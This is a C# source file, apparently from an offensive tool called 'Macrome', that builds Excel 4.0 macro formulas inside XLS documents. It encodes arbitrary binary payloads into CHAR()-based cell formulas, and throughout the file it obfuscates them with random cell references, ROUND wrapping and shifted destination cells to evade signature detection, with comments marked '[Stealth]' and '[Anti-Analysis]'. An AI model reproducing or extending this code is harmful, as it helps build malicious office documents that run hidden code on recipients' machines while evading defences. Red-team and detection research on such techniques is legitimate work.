using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography.X509Certificates;
using b2xtranslator.Spreadsheet.XlsFileFormat;
using b2xtranslator.Spreadsheet.XlsFileFormat.Ptg;
using b2xtranslator.Spreadsheet.XlsFileFormat.Records;
using b2xtranslator.xls.XlsFileFormat.Ptg;
using b2xtranslator.xls.XlsFileFormat.Records;
using b2xtranslator.xls.XlsFileFormat.Structures;

namespace Macrome
{
    public static class FormulaHelper
    {
        public const string TOOLONGMARKER = "<FORMULAISTOOLONG>";

        /// <summary>
        /// Convert a binary payload into a series of cells representing the binary data.
        /// Can be iterated across as described in https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/
        /// </summary>
        /// <param name="payload"></param>
        /// <returns></returns>
        public static List<string> BuildPayloadMacros(byte[] payload)
        {
            //Can technically go up to 255 bytes per line, but this seems to fail if we don't play it safe
            int maxLineSize = 100; 
            List<string> macros = new List<string>();
            string curMacro = "=";
            int curOffset = 0;
            bool lastCharIsPrintable = false;
            foreach (byte b in payload)
            {
                char c = (char) b;
                var isPrintable = (!Char.IsControl(c) || Char.IsWhiteSpace(c)) && (int)c < 0x80;

                if (isPrintable && curMacro.Length > 1 && !lastCharIsPrintable)
                {
                    curMacro += "&\"";
                }
                else if (!isPrintable && curMacro.Length > 1 && lastCharIsPrintable)
                {
                    curMacro += "\"&";
                }
                else if (!isPrintable && !lastCharIsPrintable && curMacro.Length > 1)
                {
                    curMacro += "&";
                }
                else if (isPrintable && !lastCharIsPrintable)
                {
                    curMacro += "\"";
                }


                if (isPrintable)
                {
                    lastCharIsPrintable = true;
                    curMacro += c;
                }
                else
                {
                    lastCharIsPrintable = false;
                    curMacro += string.Format("CHAR({0})", (int) b);
                }

                curOffset += 1;
                if (curOffset % maxLineSize == 0)
                {
                    if (lastCharIsPrintable)
                    {
                        curMacro += "\"";
                    }

                    macros.Add(curMacro);
                    curMacro = "=";
                    lastCharIsPrintable = false;
                }
            }

            if (curMacro.Length > 1)
            {
                if (lastCharIsPrintable)
                {
                    curMacro += "\"";
                }
                macros.Add(curMacro);
            }
            macros.Add("END");

            return macros;
        }

        private static Stack<AbstractPtg> GetGotoForCell(int rw, int col)
        {
            Stack<AbstractPtg> ptgStack = new Stack<AbstractPtg>();
            ptgStack.Push(new PtgRef(rw, col, false, false));
            ptgStack.Push(new PtgFuncVar(FtabValues.GOTO, 1, AbstractPtg.PtgDataType.VALUE));
            return ptgStack;
        }

        public static Stack<AbstractPtg> GetAlertPtgStack(string alertString)
        {
            Stack<AbstractPtg> ptgStack = new Stack<AbstractPtg>();

            ptgStack.Push(new PtgStr("Hello World!", false, AbstractPtg.PtgDataType.VALUE));
            ptgStack.Push(new PtgInt(2, AbstractPtg.PtgDataType.VALUE));
            ptgStack.Push(new PtgFuncVar(CetabValues.ALERT, 2, AbstractPtg.PtgDataType.VALUE));

            return ptgStack;
        }

        public static Formula GetGotoFormulaForCell(int rw, int col, int dstRw, int dstCol, int ixfe = 15)
        {
            Cell curCell = new Cell(rw, col, ixfe);
            Stack<AbstractPtg> ptgStack = GetGotoForCell(dstRw, dstCol);
            Formula gotoFormula = new Formula(curCell, FormulaValue.GetEmptyStringFormulaValue(), true, new CellParsedFormula(ptgStack));
            return gotoFormula;
        }


        public static Stack<AbstractPtg> GetCharPtgForInt(ushort charInt)
        {
            Stack<AbstractPtg> ptgStack = new Stack<AbstractPtg>();

            ptgStack.Push(new PtgInt(charInt));

            //An alternate way to invoke the CHAR function by using PtgFuncVar instead
            ptgStack.Push(new PtgFuncVar(FtabValues.CHAR, 1, AbstractPtg.PtgDataType.VALUE));
            // ptgStack.Push(new PtgFunc(FtabValues.CHAR, AbstractPtg.PtgDataType.VALUE));

            return ptgStack;
        }

        public static Stack<AbstractPtg> GetObfuscatedCharPtgForInt(ushort charInt)
        {
            Stack<AbstractPtg> ptgStack = new Stack<AbstractPtg>();

            Random r = new Random();

            //Allegedly we max out at 0xFF for column values...could be a nice accidental way of creating alternate references though
            //Generate a random PtgRef to start the stack - if it's an empty cell, this is a no-op if we end with a PtgConcat
            ptgStack.Push(new PtgRef(r.Next(1000, 2000), r.Next(0x20, 0x9F), false, false, AbstractPtg.PtgDataType.VALUE));

            ptgStack.Push(new PtgNum(charInt));
            ptgStack.Push(new PtgInt(0));

            ptgStack.Push(new PtgFunc(FtabValues.ROUND, AbstractPtg.PtgDataType.VALUE));

            //An alternate way to invoke the CHAR function by using PtgFuncVar instead
            //ptgStack.Push(new PtgFuncVar(FtabValues.CHAR, 1, AbstractPtg.PtgDataType.VALUE));
            ptgStack.Push(new PtgFunc(FtabValues.CHAR, AbstractPtg.PtgDataType.VALUE));

            //Merge the random PtgRef we generate at the beginning
            ptgStack.Push(new PtgConcat());
            return ptgStack;
        }

        public static List<BiffRecord> ConvertStringsToRecords(List<string> strings, int rwStart, int colStart, int dstRwStart, int dstColStart,
            int ixfe = 15)
        {
            List<BiffRecord> formulaList = new List<BiffRecord>();

            int curRow = rwStart;
            int curCol = colStart;

            int dstCurRow = dstRwStart;
            int dstCurCol = dstColStart;

            //TODO [Anti-Analysis] Break generated formula apart with different RUN()/GOTO() actions 
            foreach (string str in strings)
            {
                string[] rowStrings = str.Split(MacroPatterns.MacroColumnSeparator);
                List<BiffRecord> stringFormulas = new List<BiffRecord>();
                for (int colOffset = 0; colOffset < rowStrings.Length; colOffset += 1)
                {
                   //Skip empty strings
                   if (rowStrings[colOffset].Trim().Length == 0)
                   {
                       continue;
                   }

                   string rowString = rowStrings[colOffset];

                   int maxCellLength = 0x2000;
                   //One Char can take up to 8 bytes
                   int concatCharLength = 8;

                   List<BiffRecord> formulas;

                   if ((rowString.Length * concatCharLength) > maxCellLength)
                   {
                       //Given that the max actual length for a cell is 255 bytes, this is unlikely to ever be used,
                       //but the logic is being kept in case there are edge cases or there ends up being a workaround
                       //for the limitation
                       List<string> chunks = rowString.SplitStringIntoChunks(250);
                       formulas = ConvertChunkedStringToFormulas(chunks, curRow, curCol, dstCurRow, dstCurCol, ixfe);
                   }
                   else
                   {
                       string curString = rowStrings[colOffset];
                       
                       //If the string is technically 255 bytes, but needs additional encoding, we break it into two parts:
                       //ex: "=123456" becomes "=CHAR(=)&CHAR(1)&CHAR(2)&CHAR(3)&RandomCell" and =RandomVarName&"456"
                       if (curString.StartsWith(FormulaHelper.TOOLONGMARKER))
                       {
                           formulas = ConvertMaxLengthStringToFormulas(curString, curRow, curCol, dstCurRow,
                               dstCurCol + colOffset, ixfe);
                       }
                       else
                       {
                           formulas = ConvertStringToFormulas(rowStrings[colOffset], curRow, curCol, dstCurRow, dstCurCol + colOffset, ixfe);
                       }
                   }

                   stringFormulas.AddRange(formulas);

                   //If we're starting to get close to the max rowcount (0xFFFF in XLS), then move to the next row
                   if (curRow > 0xE000)
                   {
                       Formula nextRowFormula = FormulaHelper.GetGotoFormulaForCell(curRow + formulas.Count, curCol, 0, curCol + 1);
                       stringFormulas.Add(nextRowFormula);

                       curRow = 0;
                       curCol += 1;
                   }
                   else
                   {
                       curRow += formulas.Count;
                   }
                }

                dstCurRow += 1;

                formulaList.AddRange(stringFormulas);
            }

            return formulaList;
        }

        public static List<BiffRecord> ConvertMaxLengthStringToFormulas(string curString, int rwStart, int colStart, int dstRw, int dstCol, int ixfe = 15)
        {
            string actualString =
                new string(curString.Skip(FormulaHelper.TOOLONGMARKER.Length).ToArray());

            string earlyString = new string(actualString.Take(16).ToArray());
            string remainingString = new string(actualString.Skip(16).ToArray());
            List<BiffRecord> formulas = new List<BiffRecord>();

            int curRow = rwStart;
            int curCol = colStart;


            Random r = new Random();
            int rndCol = r.Next(0x90, 0x9F);
            int rndRw = r.Next(0xF000, 0xF800);
            formulas.AddRange(ConvertStringToFormulas(remainingString, curRow, curCol, rndRw, rndCol));

            curRow += formulas.Count;

            Cell remainderCell = new Cell(rndRw, rndCol);
            List<Cell> createdCells = new List<Cell>();

            //Create a formula string like 
            //"=CHAR(123)&CHAR(234)&CHAR(345)&R[RandomRw]C[RandomCol]";
            //To split the 255 bytes into multiple cells - the first few bytes are CHAR() encoded, the remaining can be wrapped in ""s
            string macroString = "=";

            foreach (char c in earlyString)
            {
                macroString += string.Format("CHAR({0})&", Convert.ToUInt16(c));
            }
            macroString += string.Format("R{0}C{1}",rndRw + 1, rndCol + 1);
            createdCells.Add(remainderCell);

            List<BiffRecord> mainFormula = ConvertStringToFormulas(macroString, curRow, curCol, dstRw, dstCol);
            formulas.AddRange(mainFormula);

            return formulas;
        }

        public static List<BiffRecord> ConvertChunkedStringToFormulas(List<string> chunkedString, int rwStart, int colStart, int dstRw,
            int dstCol, int ixfe = 15)
        {
            List<BiffRecord> formulaList = new List<BiffRecord>();
            
            List<Cell> concatCells = new List<Cell>();

            int curRow = rwStart;
            int curCol = colStart;

            foreach (string str in chunkedString)
            {
                List<Cell> createdCells = new List<Cell>();

                //TODO [Stealth] Perform additional operations to obfuscate static =CHAR(#) signature
                foreach (char c in str)
                {
                    Stack<AbstractPtg> ptgStack = GetObfuscatedCharPtgForInt(Convert.ToUInt16(c));

                    ushort charValue = Convert.ToUInt16(c);
                    if (charValue > 0xFF)
                    {
                        ptgStack = new Stack<AbstractPtg>();
                        ptgStack.Push(new PtgStr("" + c, true));
                    }
                    Cell curCell = new Cell(curRow, curCol, ixfe);
                    createdCells.Add(curCell);
                    Formula charFrm = new Formula(curCell, FormulaValue.GetEmptyStringFormulaValue(), true, new CellParsedFormula(ptgStack));
                    byte[] formulaBytes = charFrm.GetBytes();
                    formulaList.Add(charFrm);
                    curRow += 1;
                }

                Formula concatFormula = BuildConcatCellsFormula(createdCells, curRow, curCol);
                concatCells.Add(new Cell(curRow, curCol, ixfe));
                formulaList.Add(concatFormula);
                curRow += 1;
            }

            Formula concatConcatFormula = BuildConcatCellsFormula(concatCells, curRow, curCol);
            formulaList.Add(concatConcatFormula);
            curRow += 1;

            Stack<AbstractPtg> formulaPtgStack = new Stack<AbstractPtg>();

            PtgRef srcCell = new PtgRef(curRow - 1, curCol, false, false, AbstractPtg.PtgDataType.VALUE);
            formulaPtgStack.Push(srcCell);

            Random r = new Random();
            int randomBitStuffing = r.Next(1, 32) * 0x100;

            PtgRef destCell = new PtgRef(dstRw, dstCol + randomBitStuffing, false, false);
            formulaPtgStack.Push(destCell);

            PtgFuncVar funcVar = new PtgFuncVar(CetabValues.FORMULA, 2);
            formulaPtgStack.Push(funcVar);

            Formula formula = new Formula(new Cell(curRow, curCol, ixfe), FormulaValue.GetEmptyStringFormulaValue(), true, new CellParsedFormula(formulaPtgStack));
            formulaList.Add(formula);

            return formulaList;
        }

        private static List<BiffRecord> ConvertStringToFormulas(string str, int rwStart, int colStart, int dstRw, int dstCol, int ixfe = 15)
        {
            List<BiffRecord> formulaList = new List<BiffRecord>();
            List<Cell> createdCells = new List<Cell>();

            int curRow = rwStart;
            int curCol = colStart;

            //TODO [Stealth] Perform additional operations to obfuscate static =CHAR(#) signature
            foreach (char c in str)
            {
                Stack<AbstractPtg> ptgStack = GetObfuscatedCharPtgForInt(Convert.ToUInt16(c));

                ushort charValue = Convert.ToUInt16(c);
                if (charValue > 0xFF)
                {
                    ptgStack = new Stack<AbstractPtg>();
                    ptgStack.Push(new PtgStr("" + c, true));
                }
                Cell curCell = new Cell(curRow, curCol, ixfe);
                createdCells.Add(curCell);
                Formula charFrm = new Formula(curCell, FormulaValue.GetEmptyStringFormulaValue(), true, new CellParsedFormula(ptgStack));
                byte[] formulaBytes = charFrm.GetBytes();
                formulaList.Add(charFrm);
                curRow += 1;
            }

            List<BiffRecord> formulaInvocationRecords =
                BuildFORMULAFunctionCall(createdCells, curRow, curCol, dstRw, dstCol);

            formulaList.AddRange(formulaInvocationRecords);

            return formulaList;
        }

        private static List<BiffRecord> BuildFORMULAFunctionCall(List<Cell> createdCells, int curRow, int curCol, int dstRw, int dstCol)
        {
            List<BiffRecord> formulaList = new List<BiffRecord>();

            Formula concatFormula = BuildConcatCellsFormula(createdCells, curRow, curCol);
            formulaList.Add(concatFormula);
            curRow += 1;

            Stack<AbstractPtg> formulaPtgStack = new Stack<AbstractPtg>();

            PtgRef srcCell = new PtgRef(curRow - 1, curCol, false, false, AbstractPtg.PtgDataType.VALUE);
            formulaPtgStack.Push(srcCell);

            Random r = new Random();
            int randomBitStuffing = r.Next(1, 32) * 0x100;

            PtgRef destCell = new PtgRef(dstRw, dstCol + randomBitStuffing, false, false);
            formulaPtgStack.Push(destCell);

            PtgFuncVar funcVar = new PtgFuncVar(CetabValues.FORMULA, 2);
            formulaPtgStack.Push(funcVar);

            Formula formula = new Formula(new Cell(curRow, curCol), FormulaValue.GetEmptyStringFormulaValue(), true, new CellParsedFormula(formulaPtgStack));
            formulaList.Add(formula);

            return formulaList;
        }


        public static Formula BuildConcatCellsFormula(List<Cell> cells, int frmRow, int frmCol, int ixfe = 15)
        {
            Stack<AbstractPtg> ptgStack = new Stack<AbstractPtg>();

            Cell firstCell = cells.First();
            List<Cell> remainingCells = cells.TakeLast(cells.Count - 1).ToList();
            PtgRef cellRef = new PtgRef(firstCell.Rw, firstCell.Col, false, false, AbstractPtg.PtgDataType.VALUE);
            ptgStack.Push(cellRef);

            //TODO [Stealth] Use alternate concat methods beyond PtgConcat, for example CONCATENATE via PtgFuncVar
            foreach (Cell cell in remainingCells)
            {
                PtgConcat ptgConcat = new PtgConcat();
                PtgRef appendedCellRef = new PtgRef(cell.Rw, cell.Col, false, false, AbstractPtg.PtgDataType.VALUE);
                ptgStack.Push(appendedCellRef);
                ptgStack.Push(ptgConcat);
            }

            Formula f = new Formula(new Cell(frmRow, frmCol, ixfe), FormulaValue.GetEmptyStringFormulaValue(), true, new CellParsedFormula(ptgStack));
            return f;
        }

       public static List<BiffRecord> GetFormulaRecords(Formula f)
        {
            if (f.RequiresStringRecord() == false)
            {
                return new List<BiffRecord>() {f};
            }
            
            return new List<BiffRecord>()
            {
                f, 
                new STRING("\u0000", true)
            };
        }
    }
}
